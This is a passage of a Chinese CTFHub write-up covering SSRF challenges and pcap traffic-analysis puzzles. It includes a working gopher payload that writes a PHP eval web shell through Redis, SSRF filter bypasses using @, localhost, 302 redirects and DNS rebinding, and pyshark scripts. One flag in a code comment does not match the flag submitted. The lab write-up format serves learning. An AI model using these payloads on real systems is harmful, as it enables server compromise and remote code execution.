+gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2437%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27t0ur1st%27%5D%29%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
+
+When it's done you can get PHP Shell in /shell.php at the server with `cmd` as parmeter. 
+
+-----------Made-by-SpyD3r-----------
+```
+
+编写`Python`代码进行`URL`编码：
+
+```python
+from urllib.parse import quote
+
+s = """gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2437%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B%27t0ur1st%27%5D%29%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A"""
+
+encode_s = quote(s)
+print(encode_s)
+```
+
+URL编码结果如下：
+
+```
+gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252437%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527t0ur1st%2527%255D%2529%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A
+```
+
+直接访问http://challenge-7db7a1a477367662.sandbox.ctfhub.com:10800/?url=gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252437%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527t0ur1st%2527%255D%2529%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A，如果出现了504 Gateway Time-out没关系。
+
+访问靶机的`/?url=file:///var/www/html/shell.php`，可以看到信息如下：
+
+```
+REDIS0007�	redis-ver3.2.6�
+redis-bits�@�ctime�	�_i�used-mem�����%
+
+<?php @eval($_POST['t0ur1st']) ?>
+
+���p[���
+```
+
+用`AntSword`连接靶机http://challenge-7db7a1a477367662.sandbox.ctfhub.com:10800/shell.php。
+
+可以在靶机服务器根目录发现文件`flag_8669661efdfe081c68b3c723f485d41d`，打开后看到`flag`。
+
+提交`ctfhub{b5655e9078c811a62e33962e}`即可。
+
+------
+
+### URL Bypass
+
+>  请求的URL中必须包含http://notfound.ctfhub.com，来尝试利用URL的一些特殊地方绕过这个限制吧
+
+进入靶机后看到信息：
+
+> url must startwith "http://notfound.ctfhub.com"
+
+我们借助@语法绕过程序对域名的常规校验，notfound.ctfhub.com 用来 “占位”，从而利用主域名服务端，让它去请求@后的内网地址127.0.0.1/flag.php当真实目标去请求，以获取外网无法直接访问但内网可访问的flag文件内容。 
+
+构造`GET`请求`/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php`，这样可以让靶机的服务端请求内网地址127.0.0.1/flag.php，得到`ctfhub{491de14129e42cca16863c39}`。
+
+------
+
+### 数字IP Bypass
+
+> 这次ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1。该怎么办呢
+
+如果直接访问`/?url=127.0.0.1/flag.php`，会出现信息：
+
+> hacker! Ban '/127|172|@/'
+
+我们尝试用`localhost`代替`127.0.0.1`，构造`GET`请求`/?url=localhost/flag.php`，得到`flag`。
+
+提交`ctfhub{354f172a4b9d453e56a243e3}`即可。
+
+------
+
+### 302跳转 Bypass
+
+> SSRF中有个很重要的一点是请求可能会跟随302跳转，尝试利用这个来绕过对IP的检测访问到位于127.0.0.1的flag.php吧。
+
+访问靶机的`/?url=file:///var/www/html/flag.php`，可以看到禁止访问`127.0.0.1`。
+
+```php
+<?php
+error_reporting(0);
+if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
+    echo "Just View From 127.0.0.1";
+    exit;
+}
+echo getenv("CTFHUB");
+```
+
+我们可以像上一道题的做法一样，通过构造`GET`请求`/?url=localhost/flag.php`绕过，拿到`flag`。
+
+如果要正儿八经的302跳转绕过法，我们需要一台公网服务器，然后在`/var/www/html/`新建`PHP`文件`redirect.php`，内容如下：
+
+```php
+<?php
+// 当目标系统请求此脚本时，返回302重定向
+header("Location: http://127.0.0.1/flag.php"); // 要访问的内网地址
+exit();
+?>
+```
+
+然后在靶机构造`GET`请求`/?url=https://tanyaodan.com/redirect.php`，可以通过302跳转访问靶机的http://127.0.0.1/flag.php，目标服务器上的cURL客户端（配置了 CURLOPT_FOLLOWLOCATION = TRUE）在接收到302响应后，会自动地、不加验证地向 Location 头指定的新地址（即内网的 http://127.0.0.1/flag.php）发起第二次请求。由于这次请求是从服务器内网发起的（127.0.0.1就是本机），它成功绕过了网络边界防护，访问到了原本无法从外网直接访问的 flag.php。
+
+分步骤细说，①目标系统的curl解析url参数，向http://你的服务器域名/redirect.php发送请求。②外部服务器返回 302 响应，Location为http://127.0.0.1/flag.php。③由于CURLOPT_FOLLOWLOCATION = 1，curl自动跟随重定向，向127.0.0.1/flag.php发送请求。④此时访问的是内网地址，但由于跳转发生在curl内部，目标系统的正则检测仅针对初始url参数（已通过），无法拦截后续跳转，最终获取到内网资源（如 Flag）。
+
+提交`ctfhub{63411b744563f9616498e842}`即可。
+
+------
+
+### DNS重绑定 Bypass
+
+> 关键词：DNS重绑定。剩下的自己来吧，也许附件中的链接能有些帮助。
+
+虚假的附件链接：https://zhuanlan.zhihu.com/p/89426041
+
+真正的附件链接：https://lock.cmpxchg8b.com/rebinder.html
+
+访问靶机的`/?url=file:///var/www/html/flag.php`，依旧可以看到禁止访问`127.0.0.1`。
+
+```php
+<?php
+error_reporting(0);
+if ($_SERVER["REMOTE_ADDR"] != "127.0.0.1") {
+    echo "Just View From 127.0.0.1";
+    exit;
+}
+echo getenv("CTFHUB");
+```
+
+我们在A输入`127.0.0.1`，B输入`127.0.0.2`，可以生成一个链接7f000001.7f000002.rbndr.us。
+
+实现DNS重绑定后，我们访问靶机`/?url=7f000001.7f000002.rbndr.us/flag.php`可以得到`flag`。
+
+提交`ctfhub{aefa77faef415b880f08c438}`即可。
+
+------
+
+# MISC
+
+## 数据库类流量
+
+### MySQL流量
+
+下载附件后解压缩，用`WireShark`打开流量包`mysql.pcap`。输入`mysql`过滤出`MySQL`流量包，然后按`Ctrl+F`搜索字符串`ctfhub`，我们可以在一个流量包中看到`flag`字符串`ctfhub{mysql_is_S0_E4sy}`。
+
+------
+
+### Redis流量
+
+下载附件后解压缩，用`WireShark`打开流量包`redis.pcap`。按`Ctrl+F`搜索字符串`ctfhub`，然后我们可以在一个流量包中看到一半的flag，另一半flag在另一个流量包中。
+
+```
+66	105.037564	30.0.250.11	30.0.30.10	RESP	119	Request: SET Fl4g1 ctfhub{6051d6123de43df
+70	119.251861	30.0.250.11	30.0.30.10	RESP	115	Request: set flag2 ad7609804925c0121}
+```
+
+如果没有找到另一个流量包，可以直接追踪第一个流量包的`TCP`数据流拿到另一半`flag`字符串。
+
+将字符串拼接为`ctfhub{6051d6123de43dfad7609804925c0121}`，提交`flag`即可。
+
+------
+
+### MongoDB流量
+
+下载附件后解压缩，用`WireShark`打开流量包`mongodb.pcap`。输入`mongo`过滤出`MongoDB`流量包，然后`Ctrl+F`在分组字节流中查找`ctfhub{`，可以定位到以下数据包。
+
+```
+483	65.908966	30.0.250.11	30.0.30.10	MONGO	226	Request : Query
+```
+
+其中，可以看到关键字符串`ctfhub{5f284ecc279d2cbd1af258bb53c7a5f6}`，提交即可。
+
+------
+
+## ICMP协议流量分析
+
+### Data
+
+> ping 也可以携带数据?
+
+下载附件后解压缩，用`WireShark`打开流量包`icmp_data.pcap`。可以看到所有的ICMP请求包，数据流量中A后面的那一个字母组合起来刚好是这道题的`flag`。
+
+编写`Python`代码求解，将所有的ICMP数据包中的单个数据拼接起来获取`flag`。
+
+```python
+import pyshark
+
+cap = pyshark.FileCapture(
+    'icmp_data.pcap', 
+    display_filter="icmp && icmp.type==8",
+    tshark_path=r'E:\CTFTools\Wireshark\tshark.exe')
+
+flag = ''
+for packet in cap:
+    try:
+        data_hex = packet.icmp.data[16:18]
+        flag += chr(int(data_hex,16))
+        # flag += bytes.fromhex(data_hex).decode('utf-8')
+    except:
+        continue
+cap.close()
+print(flag)
+# ctfhub{c87eb997966acb}
+```
+
+提交`ctfhub{c87eb99796406ac0b}`即可。
+
+------
+
+### Length
+
+> ping 包的大小有些奇怪
+
+下载附件后解压缩，用`WireShark`打开流量包`icmp_len.pcap`，根据题目名称注意到ICMP包的长度。
+
+编写`Python`代码求解，将所有的ICMP数据包的长度转换为ASCII码后拼接起来获取`flag`。
+
+```python
+import pyshark
+
+cap = pyshark.FileCapture(
+    'icmp_len.pcap', 
+    display_filter="icmp && icmp.type ==8",
+    tshark_path=r'E:\CTFTools\Wireshark\tshark.exe')
+
+flag = ''
+for packet in cap:
+    icmp_len = packet.icmp.data_len
+    flag += chr(int(str(icmp_len)))
+
+cap.close()
+print(flag)
+# ctfhub{acb659f023}
+```
+
+提交`ctfhub{acb659f023}`即可。
+
+------
+
+### LengthBinary
+
+> ping 包的大小有些奇怪
+
+下载附件后解压缩，用`WireShark`打开流量包`icmp_len_binary.pcap`，根据提示注意到ICMP数据包的长度都是32和64，结合题目可知这有可能是01字符串。编写`Python`代码求解，将所有的ICMP数据包的长度转换为01字符串后再转换成ASCII码字符串，以获取`flag`。
+
+```python
+import pyshark
+
+cap = pyshark.FileCapture(
+    'icmp_len_binary.pcap', 
+    display_filter="icmp && icmp.type ==8",
+    tshark_path=r'E:\CTFTools\Wireshark\tshark.exe')
+
+s = ''
+for packet in cap:
+    icmp_len = int(str(packet.icmp.data_len))
+    if icmp_len == 32:
+        s += '0'
+    else:   # icmp == 64
+        s += '1'
+# print(s)
+def bin_to_ascii(bin_str):
+    ascii_str = ''
+    for i in range(0, len(bin_str), 8):
+        byte = int(bin_str[i:i+8], 2)
+        ascii_str += chr(byte)
+    return ascii_str
+
+flag = bin_to_ascii(s)
+cap.close()
+print(flag)
+# ctfhub{04efed1e05}
+```
+
+提交`ctfhub{04efed1e05}`即可。
+
+------
